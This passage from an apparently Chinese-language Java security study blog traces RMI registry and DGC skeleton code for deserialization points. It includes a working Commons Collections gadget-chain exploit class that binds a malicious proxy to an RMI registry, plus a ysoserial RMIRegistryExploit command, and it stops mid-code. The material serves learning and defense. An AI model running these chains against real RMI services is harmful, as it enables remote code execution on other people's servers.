var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255489226-5955d0b8-17fa-4bc3-9fb8-f9874b35a02f.png" alt=""></p><p>可以看到这里面会根据客户端的调用方法进入对应的case，每个case里都有反序列化点这里以lookup为例，上问分析客户端请求注册中心的时候可以知道我们获取远程对象名称是序列化传过去的，所以这里自然会反序列化读出来，这也就是一个反序列化点。</p><h3 id="客户端请求服务端————服务端">客户端请求服务端————服务端</h3><p>这里和上文提到的请求注册中心的流程基本是一样的，所以直接看不同的点就可以。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255820123-c75b9fa4-c83a-4eba-8606-52a3b90f2c3f.png" alt=""></p><p>这里可以看到断住了动态代理的stub，它也会走到dispatch方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255877543-b89eb034-b6eb-4ca3-8947-1d4f3825a13b.png" alt=""></p><p>不过这里不同的一点是skel为null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255954199-6ad0561c-f63f-4f55-a339-7978dbf2cc39.png" alt=""></p><h4 id="反序列化7">反序列化7</h4><p>所以也就不会走到oldDispatch里去继续往下走可以看到一个点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256176739-f765141c-5dcf-4724-bb3e-f583b0644ae0.png" alt=""></p><p>unmarshalValue这个方法上文之前提到过，这里面是有反序列化点的。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256249994-aed76566-89f6-40b5-b6cd-ac5f200d092c.png" alt=""></p><p>原理就是就是客户端会将参数值序列化传进去，当然这里也会反序列化读出来<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256381493-719af0b7-aea5-4ecb-8e19-ab83032100ac.png" alt=""></p><p>就是在客户端调用服务端的方法时如果有参数传入会进行序列化传入，这里我没有写传参的例子。</p><h4 id="反序列化8">反序列化8</h4><p>这里继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256504362-644428dd-1941-4708-803d-570adb1b6cf8.png" alt=""></p><p>可以看到调用了marshalValue方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256529735-312a35ab-4409-4aa8-8331-6a39dc0babe2.png" alt=""></p><p>可以看到就是一个序列化的过程，也就是服务端将返回值序列化之后返回给客户端，同样客户端需要反序列化读出来也是一个反序列化点。</p><h3 id="客户端请求服务端————DGC">客户端请求服务端————DGC</h3><p>DGC 叫做分布式垃圾回收。RMI 使用 DGC 来做自动垃圾回收。因为 RMI 包含了跨虚拟机的远程对象的引用，垃圾回收是很困难 的。DGC 使用引用计数算法来给远程对象提供自动内存管理。</p><p>在前面的调试中我们也发现了有dgc这个东西，就是在创建注册中心的时候Target里有三个对象</p><ul><li>远程服务的动态代理Stub类</li><li>注册中心的Stub类</li><li>DGCImpl_Stub</li></ul><p>这里先回到创建远程对象putTarget</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257437379-841e39e9-9354-4889-a33a-0caac3f0b824.png" alt=""></p><p>按照之前的流程来说在target里面放的还是远程对象，然后向下走，按照流程来说的话要走到<code>objTable.put(oe, target);</code>这里才会把远程对象放进去，但是还没进行的时候其实objTable里面就是放进去了一个对象也就是DGCImpl_Stub</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257621294-d141c0a5-3a54-4250-8936-a6d5d841ff62.png" alt=""></p><p>在进行put之前可以看到</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257642481-bf7e3227-dd36-4627-8051-ae2e1dfaac37.png" alt=""></p><p>这里看着是调用了dgcLog变量</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257863934-99d5b42b-5a2c-42e9-9922-a89d98444321.png" alt=""></p><p>但是可以看到dgcLog变量是静态变量，对静态变量的调用是会进行类的初始化的。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257954459-01aa69d5-3c5a-419d-ba1d-65fd2c621ba1.png" alt=""></p><p>这里是该类的静态代码块，和之前创建注册中心的很像就是dgc的创建流程。</p><p>客户端在调用的时候也是一样也会走到dispatch方法这里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732258460734-334e5a09-2430-4455-8b59-e08163f681cc.png" alt=""></p><p>这里会走到oldDispatch里和注册中心的流程一样，最后都会走到dispatch方法里</p><h4 id="反序列化9">反序列化9</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="type">long</span> var8;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var11);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到不同的case对应不同的方法，一个clean 一个dirty，可以看到都是有反序列化点的</p><p>这里其实算是攻击dgc的服务端。</p><p>看看dgc_stub端</p><h4 id="反序列化10">反序列化10</h4><p>这里直接跟着白日梦组长的视频看源码分析了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732259853602-9908d987-caee-4116-8305-158c7898dfe1.png" alt=""></p><p>在stub端的clean方法里存在着invoke方法，这里会调用execute.call方法和反序列化1很像，就是jrmp攻击的原理</p><h4 id="反序列化11">反序列化11</h4><p>往下看他的dirty方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732260283714-24ffc5eb-de7e-457e-9ea4-803a93155117.png" alt=""></p><p>会反序列化从dgc_skel传来的数据</p><h2 id="RMI攻击">RMI攻击</h2><p>参考：<a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF">https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF</a></p><p>还是需要记录下几个rmi攻击方法的。</p><h3 id="攻击注册中心">攻击注册中心</h3><h4 id="服务端攻击注册中心">服务端攻击注册中心</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServerAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">ouputMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(ouputMap, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">            <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            tmpMap.put(<span class="string">&quot;pwn&quot;</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(RMIServerAttack.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello1&quot;</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下调用过程就大概了解原理了，其实在之前的反序列化6那里就已经分析过了主要是dispatch里面触发的反序列化，这里先断住</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230635833-a048ee6b-63a2-4cae-a6a1-cbb4ae5c1859.png" alt=""></p><p>然后跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230646123-2d7c5c0b-d7f8-4c73-9969-cbab8ad9252b.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230661770-70b9a88e-20c7-403d-a712-63269212c0d1.png" alt=""></p><p>跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230696347-50fdef3a-f84a-4b81-adb1-1bb0f8282fc5.png" alt=""></p><p>这里就是最终的执行流程了这里因为使用的是bind方法所以会进入到bind对应的方法里面。</p><p>重点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">        Remote.class.getClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br></pre></td></tr></table></figure><p>Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler)</span><br></pre></td></tr></table></figure><p>上述代码中创建了一个代理对象，这个代理对象代理了Remote.class接口，handler为我们的handler对象。当调用这个代理对象的一切方法时，最终都会转到调用handler的invoke方法。</p><p>而handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230791168-9c0d078f-3bbc-4458-a0f4-be1c19df89a9.png" alt=""></p><h5 id="这里也可以直接用yso工具进行攻击">这里也可以直接用yso工具进行攻击</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit <span class="number">10.169</span><span class="number">.0</span><span class="number">.90</span> <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>其实这里自习跟踪调用栈你会发现他会先进到，case为1的逻辑里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232400419-21e87bdc-c778-407d-a04c-30f391c64dd6.png" alt=""></p><p>然后在进到case为0的情况下触发反序列化。</p><h4 id="客户端攻击注册中心">客户端攻击注册中心</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 